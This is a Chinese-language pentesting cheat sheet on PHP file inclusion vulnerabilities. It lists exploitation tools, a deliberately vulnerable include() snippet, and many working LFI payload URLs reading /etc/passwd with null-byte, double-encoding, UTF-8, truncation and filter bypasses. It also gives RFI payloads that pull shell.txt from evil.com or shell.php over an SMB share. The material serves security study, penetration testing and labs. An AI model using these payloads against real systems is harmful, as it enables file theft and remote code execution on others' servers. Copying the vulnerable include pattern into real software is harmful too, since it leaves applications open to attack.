# 文件包含漏洞

> 文件包含漏洞（File Inclusion Vulnerability）是一种常见于Web应用的安全漏洞，特别在PHP开发的应用程序中较为普遍。当应用程序在包含文件时未对用户输入进行充分验证和过滤，攻击者可能利用此漏洞包含恶意文件，导致代码执行、数据泄露或网站篡改等安全风险。

## 目录

- [工具](#工具)
- [本地文件包含(LFI)](#本地文件包含lfi)
    - [空字节截断](#空字节截断)
    - [双重编码](#双重编码)
    - [UTF-8编码](#utf-8编码)
    - [路径截断](#路径截断)
    - [过滤器绕过](#过滤器绕过)
- [远程文件包含(RFI)](#远程文件包含rfi)
    - [空字节截断](#空字节截断-1)
    - [双重编码](#双重编码-1)
    - [绕过allow_url_include限制](#绕过allow_url_include限制)
- [实验环境](#实验环境)
- [参考资料](#参考资料)

## 工具

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (2020年10月7日存档) - 用于检测和利用LFI漏洞的工具
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - 全自动LFI利用工具（含反向Shell）和扫描器
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - 用于发现、审计和利用本地及远程文件包含漏洞的Python工具
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - 通过路径遍历漏洞自动搜索和检索常见日志和配置文件内容的开源渗透测试工具
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - 本地文件包含发现与利用工具

## 本地文件包含(LFI)

**文件包含漏洞** 应与 **目录遍历** 区分开。目录遍历漏洞通常利用目标应用中的"读取"机制来访问文件，而文件包含漏洞则可能导致任意代码执行。

以下是一个基于用户输入包含文件的PHP脚本示例。如果未进行适当的输入过滤，攻击者可能操纵`page`参数来包含本地或远程文件，导致未授权访问或代码执行。

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

以下示例展示了如何包含`/etc/passwd`文件，更多有趣的文件路径请参考`目录与路径遍历`章节。

```
http://example.com/index.php?page=../../../etc/passwd
```

### 空字节截断

:warning: 在PHP 5.3.4以下版本中，可以使用空字节(`%00`)截断字符串。

```
http://example.com/index.php?page=../../../etc/passwd%00
```

**示例**: Joomla! 组件 Web TV 1.0 - CVE-2010-1470

```
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### 双重编码

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8编码

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### 路径截断

在大多数PHP安装中，超过4096字节的文件名会被截断，因此任何多余的字符都会被丢弃。

```
http://example.com/index.php?page=../../../etc/passwd............[添加更多]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[添加更多]
http://example.com/index.php?page=../../../etc/passwd/./././././.[添加更多] 
http://example.com/index.php?page=../../../[添加更多]../../../../etc/passwd
```

### 过滤器绕过

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../\%5C../etc/passwd
```

## 远程文件包含(RFI)

> 远程文件包含(RFI)是一种漏洞类型，当应用程序在包含文件时未对用户输入进行适当验证或过滤，导致可以包含远程文件。

由于PHP 5之后默认禁用了`allow_url_include`，远程文件包含在默认配置下不再有效。

```ini
allow_url_include = On
```

大多数LFI部分的过滤器绕过技术都可以用于RFI。

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 空字节

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### 双重编码

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### 绕过allow_url_include限制

当`allow_url_include`和`allow_url_fopen`都设置为`Off`时，在Windows系统上仍然可以使用`smb`协议包含远程文件。

1. 创建一个对所有人开放的共享
2. 在文件中写入PHP代码：`shell.php`
3. 包含它：`http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## 实验环境

- [Root Me - 本地文件包含](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
- [Root Me - 本地文件包含 - 双重编码](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
- [Root Me - 远程文件包含](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [Root Me - PHP - 过滤器](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## 参考资料

- [CVV #1: 本地文件包含 - SI9INT - 2018年6月20日](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [利用PHP应用程序中的远程文件包含(RFI)并绕过远程URL包含限制 - Mannu Linux - 2019年5月12日](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
- [PHP在什么情况下容易受到攻击？ - 2015年4月13日 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [LFI 备忘单 - @Arr0way - 2016年4月24日](https://highon.coffee/blog/lfi-cheat-sheet/)
- [测试本地文件包含 - OWASP - 2017年6月25日](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [将LFI转变为RFI - Grayson Christopher - 2017年8月14日](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)

---


